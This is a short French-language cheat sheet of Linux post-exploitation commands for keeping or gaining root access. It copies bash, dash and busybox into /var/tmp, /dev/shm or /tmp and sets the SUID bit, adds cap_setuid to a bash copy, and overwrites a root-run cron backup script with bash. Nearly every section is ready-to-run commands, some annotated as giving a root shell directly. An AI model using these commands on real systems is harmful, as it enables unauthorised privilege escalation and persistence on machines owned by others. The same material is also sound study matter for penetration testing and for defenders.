# bash

## SUID

Souvent, /tmp est monté avec la directive de sécurité nosuid (qui neutralise le bit 4755 ou 6755). Si la copie dans /tmp ne fonctionne pas, la variante consiste à tester d'autres répertoires temporaires :  

```shell
cp /bin/bash /var/tmp/bash && chmod 4755 /var/tmp/bash
# ou dans la mémoire partagée :
cp /bin/bash /dev/shm/bash && chmod 4755 /dev/shm/bash
```

On peut vérifier dans le fstab ou avec :

```shell
findmnt -T /tmp
```

## Capability

```shell
cp /bin/bash /tmp/capbash
setcap cap_setuid+ep /tmp/capbash
/tmp/capbash -p
```

## Cron

cron exécuté en root

```shell
cp /bin/bash /usr/local/bin/script_de_backup.sh
```

## Dash

```shell
cp /bin/dash /tmp/rootdash && chmod 4755 /tmp/rootdash
/tmp/rootdash # Donne directement un shell root sans option -p
```

## Busybox

```shell
cp /bin/busybox /tmp/rootbox && chmod 4755 /tmp/rootbox
/tmp/rootbox sh # Lance le shell intégré avec les droits root
```
